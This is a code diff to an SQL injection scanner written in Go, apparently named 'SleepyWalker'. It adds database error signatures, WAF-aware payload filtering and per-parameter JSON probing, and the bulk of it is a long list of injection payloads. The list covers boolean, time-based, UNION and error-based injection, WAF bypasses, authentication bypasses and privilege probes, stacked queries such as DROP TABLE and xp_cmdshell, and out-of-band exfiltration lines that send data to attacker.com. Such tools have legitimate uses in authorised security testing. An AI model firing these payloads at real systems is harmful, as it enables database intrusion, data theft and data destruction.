@@ -39,6 +39,11 @@ var sqlErrorSignatures = []struct {
 	{"MySQL", "mysql_fetch"},
 	{"MySQL", "mysql_num_rows"},
 	{"MySQL", "supplied argument is not a valid mysql"},
+	{"MySQL", "column count doesn't match value count"},
+	{"MySQL", "data truncated for column"},
+	{"MySQL", "unknown column"},
+	{"MySQL", "table doesn't exist"},
+	{"MySQL", "duplicate entry"},
 
 	// PostgreSQL
 	{"PostgreSQL", "pg_query():"},
@@ -46,6 +51,10 @@ var sqlErrorSignatures = []struct {
 	{"PostgreSQL", "unterminated quoted string"},
 	{"PostgreSQL", "syntax error at or near"},
 	{"PostgreSQL", "invalid input syntax for"},
+	{"PostgreSQL", "current transaction is aborted"},
+	{"PostgreSQL", "permission denied for"},
+	{"PostgreSQL", "relation \""},
+	{"PostgreSQL", "column \""},
 
 	// Microsoft SQL Server
 	{"MSSQL", "microsoft ole db provider for sql server"},
@@ -53,40 +62,369 @@ var sqlErrorSignatures = []struct {
 	{"MSSQL", "[microsoft][odbc sql server driver]"},
 	{"MSSQL", "mssql_query()"},
 	{"MSSQL", "incorrect syntax near"},
+	{"MSSQL", "conversion failed when converting"},
+	{"MSSQL", "arithmetic overflow error"},
+	{"MSSQL", "string or binary data would be truncated"},
+	{"MSSQL", "transaction (process id"},
+	{"MSSQL", "is not a recognized built-in function"},
 
 	// Oracle
 	{"Oracle", "ora-00933"},
 	{"Oracle", "ora-01756"},
 	{"Oracle", "ora-06512"},
+	{"Oracle", "ora-00921"},
+	{"Oracle", "ora-01476"},
+	{"Oracle", "ora-01789"},
+	{"Oracle", "ora-00936"},
+	{"Oracle", "ora-29257"},
 	{"Oracle", "oracle error"},
 	{"Oracle", "quoted string not properly terminated"},
+	{"Oracle", "missing expression"},
 
 	// SQLite
 	{"SQLite", "sqlite3::query"},
 	{"SQLite", "sqlite_error"},
 	{"SQLite", "sqlite.exception"},
 	{"SQLite", "near \"\": syntax error"},
+	{"SQLite", "unrecognized token"},
+	{"SQLite", "no such table"},
+	{"SQLite", "no such column"},
+	{"SQLite", "sqlite3.operationalerror"},
 
-	// Generic JDBC / ODBC
-	{"JDBC/ODBC", "jdbc."},
+	// IBM DB2
+	{"DB2", "db2 sql error"},
+	{"DB2", "sqlcode=-"},
+	{"DB2", "com.ibm.db2"},
+	{"DB2", "[ibm][cli driver]"},
+	{"DB2", "db2_exec"},
+	{"DB2", "sqlstate="},
+
+	// SAP HANA
+	{"HANA", "hdb error"},
+	{"HANA", "sap hana"},
+	{"HANA", "invalid column name"},
+	{"HANA", "sql syntax error exception"},
+
+	// Firebird / InterBase
+	{"Firebird", "dynamic sql error"},
+	{"Firebird", "isc_dsql_error"},
+	{"Firebird", "firebird.error"},
+	{"Firebird", "token unknown"},
+
+	// Informix
+	{"Informix", "informix odbc driver"},
+	{"Informix", "com.informix.jdbc"},
+	{"Informix", "ifx_"},
+	{"Informix", "a syntax error has occurred"},
+
+	// Sybase / SAP ASE
+	{"Sybase", "sybase message"},
+	{"Sybase", "incorrect syntax near"},
+	{"Sybase", "sybsystemprocs"},
+	{"Sybase", "adaptive server anywhere"},
+
+	// MongoDB (NoSQL injection indicators)
+	{"MongoDB", "mongoerror"},
+	{"MongoDB", "unterminated string literal"},
+	{"MongoDB", "command failed"},
+	{"MongoDB", "errmsg"},
+
+	// CockroachDB
+	{"CockroachDB", "cockroach"},
+	{"CockroachDB", "unexpected at or near"},
+	{"CockroachDB", "target column"},
+
+	// H2 Database
+	{"H2", "org.h2.jdbc"},
+	{"H2", "h2 database"},
+	{"H2", "syntax error in sql statement"},
+
+	// MariaDB specific
+	{"MariaDB", "mariadb"},
+	{"MariaDB", "got error 28"},
+
+	// Generic JDBC / ODBC / drivers
+	{"JDBC/ODBC", "[jdbc"},
 	{"JDBC/ODBC", "[odbc"},
-	{"JDBC/ODBC", "sql syntax"},
-	{"JDBC/ODBC", "sql error"},
+	{"JDBC/ODBC", "sql syntax error"},
+	{"JDBC/ODBC", "sqlexception"},
+	{"JDBC/ODBC", "system.data.sqlclient"},
+	{"JDBC/ODBC", "pdo::query"},
+	{"JDBC/ODBC", "pdoexception"},
+	{"JDBC/ODBC", "adodb.field error"},
+	{"JDBC/ODBC", "data.odbc.odbcexception"},
 }
 
-// testPayloads are classic probe strings injected into parameter values.
-// Organized by detection category for context-aware prioritization.
+// testPayloads are probe strings injected into parameter values.
+// Covers: syntax breaks, boolean, time-based, error-based, UNION,
+// WAF bypass (comments/encoding/case/null bytes), DB-specific (MySQL, MSSQL, PostgreSQL,
+// Oracle, SQLite, DB2, MongoDB, H2, Firebird, CockroachDB), stacked queries, OOB, NoSQL.
 var testPayloads = []string{
+	// ── Basic syntax breakers ──────────────────────────────────────
 	"'",
 	"\"",
+	"`",
+	"')",
+	"')--",
+	"\")",
+	"\\",
+	"';",
+	"' --",
+
+	// ── Boolean injection ──────────────────────────────────────────
 	"1' OR '1'='1",
 	"1\" OR \"1\"=\"1",
 	"1 OR 1=1--",
 	"' OR ''='",
+	"1' OR '1'='1'/*",
+	"1 OR 1=1#",
+	"' OR 1=1-- -",
+	"') OR ('1'='1",
+	"1' OR 1=1 LIMIT 1-- -",
+	"' OR 'x'='x",
+	"1' OR '1'='1' OR ''='",
+	"admin'--",
+	"admin' #",
+	"' OR 1=1/*",
+	"1' OR 1#",
+
+	// ── Time-based blind ───────────────────────────────────────────
 	"'; WAITFOR DELAY '0:0:5'--",
-	"1; SELECT 1--",
-	"' UNION SELECT NULL--",
+	"1' AND SLEEP(5)-- -",
+	"1'; SELECT pg_sleep(5)-- -",
+	"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
+	"1';WAITFOR DELAY '0:0:5'--",
+	"1' AND BENCHMARK(10000000,MD5('a'))-- -",
+	"1' OR SLEEP(5)-- -",
+	"1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
+	"1';SELECT DBMS_LOCK.SLEEP(5) FROM dual-- -",
+	"1' AND 1=LIKE('A',UPPER(HEX(RANDOMBLOB(50000000))))-- -",
+
+	// ── Error-based extraction ─────────────────────────────────────
 	"1' AND 1=CONVERT(int,(SELECT @@version))--",
+	"1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
+	"1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)-- -",
+	"1' AND CAST((SELECT version()) AS int)-- -",
+	"1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+	"1' AND EXP(~(SELECT * FROM (SELECT VERSION())a))-- -",
+	"1' AND GTID_SUBSET(CONCAT(0x7e,VERSION()),1)-- -",
+	"1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,VERSION())) USING utf8)))-- -",
+	"1' HAVING 1=1-- -",
+	"1' AND POLYGON((SELECT * FROM(SELECT * FROM(SELECT CONCAT(0x7e,VERSION()))a)b))-- -",
+
+	// ── UNION-based ────────────────────────────────────────────────
+	"' UNION SELECT NULL--",
+	"1; SELECT 1--",
+	"' UNION SELECT NULL,NULL--",
+	"' UNION SELECT NULL,NULL,NULL--",
+	"1' UNION ALL SELECT NULL,NULL,CONCAT(0x716b7a71,0x41,0x7162787171)-- -",
+	"' UNION SELECT 1,2,3,4-- -",
+	"1' UNION SELECT @@version-- -",
+	"-1 UNION SELECT 1,2,3-- -",
+	"' UNION ALL SELECT NULL,NULL,NULL,NULL-- -",
+	"' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
+
+	// ── WAF bypass: inline comments ────────────────────────────────
+	"1'/*!50000OR*/'1'='1",
+	"1'/**/OR/**/1=1-- -",
+	"1'/*!UNION*//*!SELECT*/NULL-- -",
+	"1'/**/ AND/**/1=1-- -",
+	"/*!32302 1*/",
+	"1' /*!50000UNION*/ /*!50000ALL*/ /*!50000SELECT*/ NULL-- -",
+	"1'/**//*!50000UNION*//**//*!50000SELECT*//**/1-- -",
+
+	// ── WAF bypass: encoding & case alternation ────────────────────
+	"1' oR '1'='1",
+	"1' AnD '1'='1'-- -",
+	"1'%20OR%20'1'%3D'1",
+	"1' OR 1=1-- -",
+	"1' uNiOn SeLeCt NULL-- -",
+	"1' UNI%4FN SEL%45CT NULL-- -",
+	"1'+OR+'1'='1",
+	"1'||'1'='1",
+
+	// ── WAF bypass: double encoding & HPP ──────────────────────────
+	"1%27%20OR%20%271%27%3D%271",
+	"1' /*!00000OR*/ 1=1-- -",
+	"%2527%2520OR%25201%253D1",
+	"1'%250aOR%250a'1'='1",
+
+	// ── WAF bypass: null bytes & whitespace tricks ─────────────────
+	"1'%00OR%00'1'='1",
+	"1'\tOR\t1=1-- -",
+	"1'\nOR\n1=1-- -",
+	"1' OR%0b1=1-- -",
+
+	// ── Stacked queries ────────────────────────────────────────────
+	"1'; DROP TABLE sw_test-- -",
+	"1'; SELECT 1;-- -",
+	"1'; EXEC xp_cmdshell('echo 1')-- -",
+	"1';INSERT INTO sw_test VALUES(1)-- -",
+	"1'; DECLARE @a int-- -",
+
+	// ── DB-specific: IBM DB2 ───────────────────────────────────────
+	"1' AND 1=(SELECT COUNT(*) FROM sysibm.sysdummy1)-- -",
+	"1' UNION SELECT NULL FROM sysibm.sysdummy1-- -",
+	"1'; VALUES CURRENT SERVER-- -",
+
+	// ── DB-specific: Oracle ────────────────────────────────────────
+	"1' AND 1=1 FROM dual-- -",
+	"' UNION SELECT NULL FROM dual-- -",
+	"' UNION SELECT banner FROM v$version WHERE ROWNUM=1-- -",
+	"1' AND ROWNUM=1-- -",
+
+	// ── DB-specific: MSSQL ─────────────────────────────────────────
+	"1' AND @@SERVERNAME=@@SERVERNAME-- -",
+	"' UNION SELECT @@version-- -",
+	"1' UNION SELECT name FROM master..sysdatabases-- -",
+
+	// ── DB-specific: PostgreSQL ────────────────────────────────────
+	"1' AND current_database()=current_database()-- -",
+	"' UNION SELECT version()-- -",
+	"1' AND 1=1::int-- -",
+	"$$;SELECT version()--$$",
+
+	// ── DB-specific: SQLite ────────────────────────────────────────
+	"1' AND sqlite_version()=sqlite_version()-- -",
+	"' UNION SELECT sql FROM sqlite_master-- -",
+	"' UNION SELECT name FROM sqlite_master WHERE type='table'-- -",
+
+	// ── DB-specific: MongoDB (NoSQL) ───────────────────────────────
+	"{\"$gt\":\"\"}",
+	"{\"$ne\":null}",
+	"[$ne]=1",
+	"true, $where: '1 == 1'",
+	"'; return true; var x='",
+	"{\"$regex\":\".*\"}",
+
+	// ── DB-specific: CockroachDB ───────────────────────────────────
+	"1' AND version() LIKE '%CockroachDB%'-- -",
+
+	// ── DB-specific: H2 ───────────────────────────────────────────
+	"1'; CALL HASH('SHA256','test',1)-- -",
+	"1' UNION SELECT H2VERSION()-- -",
+
+	// ── DB-specific: Firebird ──────────────────────────────────────
+	"1' AND 1=1 FROM rdb$database-- -",
+	"' UNION SELECT CURRENT_USER FROM rdb$database-- -",
+
+	// ── DB-specific: Informix ──────────────────────────────────────
+	"1' AND 1=(SELECT DBSERVERNAME FROM systables WHERE tabid=1)-- -",
+	"' UNION SELECT FIRST 1 tabname FROM systables-- -",
+
+	// ── DB-specific: SAP HANA ──────────────────────────────────────
+	"1' AND 1=(SELECT COUNT(*) FROM SYS.M_DATABASE)-- -",
+	"' UNION SELECT CURRENT_USER FROM DUMMY-- -",
+
+	// ── Out-of-band ────────────────────────────────────────────────
+	"1' AND LOAD_FILE('\\\\\\\\attacker.com\\\\a')-- -",
+	"1'; EXEC master..xp_dirtree '\\\\\\\\attacker.com\\\\a'-- -",
+
+	// ── JSON/XML injection boundaries ──────────────────────────────
+	"1' OR '1'='1' -- -",
+	"<foo val=\"a]\" /><bar val=\"INJECTED\"/>",
+
+	// ── Second-order / stored markers ──────────────────────────────
+	"sw_probe'",
+	"test<script>",
+	"' || (SELECT '') || '",
+
+	// ── Advanced: nested subquery / filter bypass ───────────────────
+	"1' AND 1=(SELECT 1 FROM (SELECT 1)a WHERE 1=1 AND 1=1)-- -",
+	"1' AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(database()) AS CHAR),0x7e)))FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+	"1' AND 1=(SELECT TOP 1 CAST(name AS int) FROM master..sysobjects WHERE xtype='U')-- -",
+	"'||(SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % sw SYSTEM \"http://x.x\">%sw;]>'),'/l') FROM dual)||'",
+	"1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_schema=DB_NAME()))-- -",
+
+	// ── Advanced: conditional errors (blind) ───────────────────────
+	"1' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)-- -",
+	"1' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)='1",
+	"1' AND 1=(SELECT CASE WHEN(1=1) THEN CAST(1/0 AS int) ELSE 1 END)-- -",
+	"1' AND (SELECT COUNT(*) FROM generate_series(1,10000000))>0-- -",
+	"1'||(CASE WHEN 1=1 THEN '' ELSE TO_CHAR(1/0) END)||'",
+
+	// ── Advanced: order-by / group-by injection ────────────────────
+	"1 ORDER BY 1-- -",
+	"1 ORDER BY 100-- -",
+	"1,(SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+	"IF(1=1,1,(SELECT 1 FROM mysql.user))",
+	"(SELECT*FROM(SELECT 1)a JOIN(SELECT 2)b JOIN(SELECT 3)c)",
+
+	// ── Advanced: LIKE/BETWEEN/IN filter bypass ────────────────────
+	"1' AND 1=1 AND 'a' LIKE 'a",
+	"1' AND 1 BETWEEN 1 AND 1-- -",
+	"1' AND 1 IN (1)-- -",
+	"1' AND 1 NOT IN (2)-- -",
+	"1' AND 'sw' LIKE 's%'-- -",
+
+	// ── Advanced: scientific notation & type juggling ───────────────
+	"1' AND 1e0=1e0-- -",
+	"0e0' UNION SELECT NULL-- -",
+	"1' AND 0x31=0x31-- -",
+	".1' AND 1=1-- -",
+	"1' AND 1.e(0)-- -",
+
+	// ── Advanced: multiline / CRLF injection ───────────────────────
+	"1'\r\nOR\r\n'1'='1",
+	"1'%0d%0aOR%0d%0a1=1-- -",
+	"1'%0aUNION%0aSELECT%0aNULL-- -",
+	"1'%0a%0dAND%0a%0d1=1-- -",
+
+	// ── Advanced: HTTP Parameter Pollution split ────────────────────
+	"1'/*&id=*/OR/*&id=*/'1'='1",
+	"1&id=1' OR '1'='1",
+
+	// ── Advanced: JSON deserialization / type confusion ─────────────
+	"{\"id\":{\"$gt\":0,\"$or\":[{},{}]}}",
+	"{\"$where\":\"this.password.match(/.*/)!=null\"}",
+	"{\"username\":{\"$regex\":\"^adm\"},\"password\":{\"$ne\":\"\"}}",
+	"[{\"$lookup\":{\"from\":\"users\",\"localField\":\"x\",\"foreignField\":\"y\",\"as\":\"z\"}}]",
+
+	// ── Advanced: chained/polyglot payloads ─────────────────────────
+	"1'\"-- -/**/;%00",
+	"'-var x=1-var y=2-'",
+	"'+(select 1 and row(1,1)>(select count(*),concat(version(),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'",
+	"\"XOR(if(now()=sysdate(),sleep(5),0))XOR\"",
+	"if(now()=sysdate(),sleep(5),0)",
+	"'XOR(if(now()=sysdate(),sleep(5),0))XOR'",
+	"';SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
+	"1);(SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
+
+	// ── Advanced: authentication bypass patterns ────────────────────
+	"' OR 1=1 LIMIT 1 OFFSET 0-- -",
+	"' OR 1=1 ORDER BY 1 DESC-- -",
+	"admin' OR '1'='1'#",
+	"admin')-- -",
+	"') OR ('x')=('x",
+	"' OR username LIKE '%",
+	"' UNION SELECT 'admin','password'-- -",
+
+	// ── Advanced: bit manipulation / math tricks ────────────────────
+	"1' AND 1&1-- -",
+	"1' AND ~~1-- -",
+	"1'|1-- -",
+	"1' AND 1 XOR 0-- -",
+	"1' DIV 1-- -",
+	"1' MOD 1-- -",
+
+	// ── Advanced: DNS/HTTP exfiltration (no callback needed) ────────
+	"1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.attacker.com\\\\a'))-- -",
+	"1'; EXEC master..xp_dirtree('\\\\\\\\'+@@version+'.attacker.com\\\\x')-- -",
+	"1' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual)='1",
+
+	// ── Advanced: privilege escalation probes ───────────────────────
+	"1' UNION SELECT grantee,privilege_type FROM information_schema.user_privileges-- -",
+	"1' UNION SELECT user,file_priv FROM mysql.user-- -",
+	"1' AND IS_SRVROLEMEMBER('sysadmin')=1-- -",
+	"1' AND (SELECT super_priv FROM mysql.user WHERE user=CURRENT_USER() LIMIT 1)='Y'-- -",
+
+	// ── Advanced: WAF bypass using concat/char functions ────────────
+	"1' AND 1=1 AND CHAR(49)=CHAR(49)-- -",
+	"1' AND CONCAT('s','w')='sw'-- -",
+	"1' UNION SELECT CHR(65)||CHR(66) FROM dual-- -",
+	"1'AND(1)=(1)AND'1'='1",
+	"1' AND/**/'1'='1'-- -",
+	"-1' UNION SELECT CONCAT_WS(0x3a,user(),database(),version())-- -",
 }
 
 // contextPriorityPayloads returns payloads reordered for the detected context.
@@ -188,15 +526,21 @@ func matchErrorSignaturesEnriched(body string) []string {
 // HeuristicScan probes every entry point with common SQL injection payloads
 // and inspects the HTTP response body for known database error signatures.
 // Uses concurrency when threads > 1. Respects cfg.MaxRequests budget via RateLimiter.
-func HeuristicScan(cfg *config.Config, eps []EntryPoint) []HeuristicResult {
+func HeuristicScan(cfg *config.Config, eps []EntryPoint, blockedTokens ...[]string) []HeuristicResult {
 	client := cfg.BuildHTTPClient(10 * time.Second)
 	threads := cfg.Threads
 	if threads < 1 {
 		threads = 1
 	}
 
-	// Fix #5: create a rate limiter that gates every probe request.
+	// Fix #5/#6: create a rate limiter that gates every probe request.
 	rl := utils.NewRateLimiter(cfg.RateDelay, cfg.MaxRequests)
+
+	// Enhance 1: collect WAF-blocked tokens for payload filtering.
+	var blocked []string
+	if len(blockedTokens) > 0 {
+		blocked = blockedTokens[0]
+	}
 
 	results := make([]HeuristicResult, len(eps))
 	sem := make(chan struct{}, threads)
@@ -209,7 +553,7 @@ func HeuristicScan(cfg *config.Config, eps []EntryPoint) []HeuristicResult {
 			sem <- struct{}{}        // acquire
 			defer func() { <-sem }() // release
 
-			hr := probeEntryPoint(client, cfg, ep, rl)
+			hr := probeEntryPoint(client, cfg, ep, rl, blocked)
 			results[idx] = hr
 			if hr.Suspicious {
 				log.Printf("[HEURISTIC] ⚠  Suspicious: %s %s [%s] (errors: %v, payload: %q)",
@@ -227,7 +571,7 @@ func HeuristicScan(cfg *config.Config, eps []EntryPoint) []HeuristicResult {
 // respecting the rate limiter for every request sent.
 // Phase 1a: error-based detection (fast)
 // Phase 1b: blind pre-screen (boolean differential) if no errors found
-func probeEntryPoint(client *http.Client, cfg *config.Config, ep EntryPoint, rl *utils.RateLimiter) HeuristicResult {
+func probeEntryPoint(client *http.Client, cfg *config.Config, ep EntryPoint, rl *utils.RateLimiter, blocked []string) HeuristicResult {
 	db := learningdb.Global()
 
 	// Skip if this URL+param was previously confirmed clean by the learning DB.
@@ -242,6 +586,12 @@ func probeEntryPoint(client *http.Client, cfg *config.Config, ep EntryPoint, rl 
 	// ── Phase 1a: error signature matching ──────────────────────────
 	rawPayloads := effectivePayloads(ep.InjectionLoc)
 	payloads := contextPriorityPayloads(rawPayloads, ep.InjectionLoc)
+
+	// Enhance 1: filter out payloads containing WAF-blocked tokens.
+	if len(blocked) > 0 {
+		payloads = filterBlockedPayloads(payloads, blocked)
+	}
+
 	for _, payload := range payloads {
 		if !rl.Wait() {
 			log.Printf("[HEURISTIC] Request budget exhausted, stopping probes for %s", ep.URL)
@@ -255,7 +605,6 @@ func probeEntryPoint(client *http.Client, cfg *config.Config, ep EntryPoint, rl 
 		matched := matchErrorSignaturesEnriched(body)
 		if len(matched) > 0 {
 			if db != nil {
-				// Record once as a successful hit (attempt=1, fired=true).
 				db.RecordPayloadAttempt(payload, ep.InjectionLoc, "", true)
 			}
 			return HeuristicResult{
@@ -265,19 +614,16 @@ func probeEntryPoint(client *http.Client, cfg *config.Config, ep EntryPoint, rl 
 				TestPayload:   payload,
 			}
 		}
-		// Payload did not fire — record as a failed attempt.
 		if db != nil {
 			db.RecordPayloadAttempt(payload, ep.InjectionLoc, "", false)
 		}
 	}
 
 	// ── Phase 1b: blind pre-screen (boolean) ───────────────────────
-	// No error signatures found — do a fast boolean differential to catch
-	// blind SQLi where errors are suppressed.
 	if !rl.Wait() {
 		return HeuristicResult{Entry: ep, Suspicious: false}
 	}
-	if blindPreScreen(client, cfg, ep) {
+	if blindPreScreen(client, cfg, ep, rl) {
 		log.Printf("[HEURISTIC] ⚠  Blind candidate: %s %s [%s] (boolean differential detected)",
 			ep.Method, ep.URL, ep.InjectionLoc)
 		return HeuristicResult{
@@ -289,13 +635,10 @@ func probeEntryPoint(client *http.Client, cfg *config.Config, ep EntryPoint, rl 
 	}
 
 	// ── Phase 1c: time-based pre-screen ─────────────────────────────
-	// Boolean differential failed — endpoint may suppress all output changes.
-	// Do a single-round timing check: if a SLEEP payload takes significantly
-	// longer than baseline, flag for full Phase 2 time-blind validation.
 	if !rl.Wait() {
 		return HeuristicResult{Entry: ep, Suspicious: false}
 	}
-	if timePreScreen(client, cfg, ep) {
+	if timePreScreen(client, cfg, ep, rl) {
 		log.Printf("[HEURISTIC] ⚠  Blind candidate: %s %s [%s] (timing anomaly detected)",
 			ep.Method, ep.URL, ep.InjectionLoc)
 		return HeuristicResult{
@@ -309,6 +652,28 @@ func probeEntryPoint(client *http.Client, cfg *config.Config, ep EntryPoint, rl 
 	return HeuristicResult{Entry: ep, Suspicious: false}
 }
 
+// filterBlockedPayloads removes payloads containing WAF-blocked tokens.
+func filterBlockedPayloads(payloads []string, blocked []string) []string {
+	var out []string
+	for _, pl := range payloads {
+		plUpper := strings.ToUpper(pl)
+		skip := false
+		for _, token := range blocked {
+			if strings.Contains(plUpper, strings.ToUpper(token)) {
+				skip = true
+				break
+			}
+		}
+		if !skip {
+			out = append(out, pl)
+		}
+	}
+	if len(out) == 0 {
+		return payloads // don't filter everything away
+	}
+	return out
+}
+
 // blindPreScreen performs a boolean-based differential check to detect blind SQL injection.
 // The key insight that eliminates false positives like YouTube:
 //
@@ -318,7 +683,7 @@ func probeEntryPoint(client *http.Client, cfg *config.Config, ep EntryPoint, rl 
 // We require the true condition to closely match the original baseline AND
 // the false condition to differ from it. Both must hold consistently across
 // 2 rounds to survive dynamic content (timestamps, ads, CSRF tokens).
-func blindPreScreen(client *http.Client, cfg *config.Config, ep EntryPoint) bool {
+func blindPreScreen(client *http.Client, cfg *config.Config, ep EntryPoint, rl *utils.RateLimiter) bool {
 	params := ep.Params
 	if len(params) == 0 {
 		params = map[string]string{"id": "1"}
@@ -728,14 +1093,50 @@ func sendHeaderProbeWithStatus(client *http.Client, cfg *config.Config, ep Entry
 	return doRequestWithStatus(client, req)
 }
 
-// sendJSONProbeWithStatus sends a JSON POST body, returns body + status.
+// sendJSONProbeWithStatus sends a JSON POST body testing each param individually, returns body + status.
 func sendJSONProbeWithStatus(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, int, error) {
-	jsonBody := make(map[string]string)
-	for key := range ep.Params {
-		jsonBody[key] = payload
+	params := ep.Params
+	if len(params) == 0 {
+		params = map[string]string{"id": ""}
 	}
-	if len(ep.Params) == 0 {
-		jsonBody["id"] = payload
+
+	// Test each param individually for isolation (fix #3).
+	for targetKey := range params {
+		jsonBody := make(map[string]interface{})
+		for key, val := range params {
+			if key == targetKey {
+				jsonBody[key] = payload
+			} else {
+				neutral := val
+				if neutral == "" {
+					neutral = "1"
+				}
+				jsonBody[key] = neutral
+			}
+		}
+		bodyBytes, err := json.Marshal(jsonBody)
+		if err != nil {
+			continue
+		}
+		req, err := http.NewRequest("POST", ep.URL, bytes.NewReader(bodyBytes))
+		if err != nil {
+			continue
+		}
+		req.Header.Set("Content-Type", "application/json")
+		req.Header.Set("User-Agent", "SleepyWalker/1.0")
+		cfg.ApplyHeaders(req)
+		body, code, err := doRequestWithStatus(client, req)
+		if err != nil {
+			continue
+		}
+		if len(matchErrorSignatures(body)) > 0 {
+			return body, code, nil
+		}
+	}
+	// Fallback: inject all params.
+	jsonBody := make(map[string]interface{})
+	for key := range params {
+		jsonBody[key] = payload
 	}
 	bodyBytes, err := json.Marshal(jsonBody)
 	if err != nil {
@@ -848,7 +1249,7 @@ func sendPathProbeWithStatus(client *http.Client, cfg *config.Config, ep EntryPo
 // timePreScreen does a fast single-round timing check.
 // Tests MySQL, PostgreSQL, MSSQL, and SQLite time-delay payloads.
 // Tests only the first likely-injectable parameter to avoid N×4 requests per endpoint.
-func timePreScreen(client *http.Client, cfg *config.Config, ep EntryPoint) bool {
+func timePreScreen(client *http.Client, cfg *config.Config, ep EntryPoint, rl *utils.RateLimiter) bool {
 	timeClient := &http.Client{
 		Timeout: 15 * time.Second,
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
@@ -876,14 +1277,22 @@ func timePreScreen(client *http.Client, cfg *config.Config, ep EntryPoint) bool 
 		// MySQL (numeric and string-quoted)
 		"1 AND SLEEP(3)-- -",
 		"1' AND SLEEP(3)-- -",
+		"1') AND SLEEP(3)-- -",
+		"1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- -",
 		// PostgreSQL
 		"1; SELECT pg_sleep(3)-- -",
 		"1'; SELECT pg_sleep(3)-- -",
+		"1'||(SELECT '' FROM pg_sleep(3))-- -",
 		// MSSQL
 		"1; WAITFOR DELAY '0:0:3'-- -",
 		"1'; WAITFOR DELAY '0:0:3'-- -",
+		"1'); WAITFOR DELAY '0:0:3'-- -",
+		// Oracle
+		"1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- -",
 		// SQLite (heavy computation as time proxy)
 		"1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))-- -",
+		// WAF bypass
+		"1'/*!50000AND*/SLEEP(3)-- -",
 	}
 
 	baseStart := time.Now()
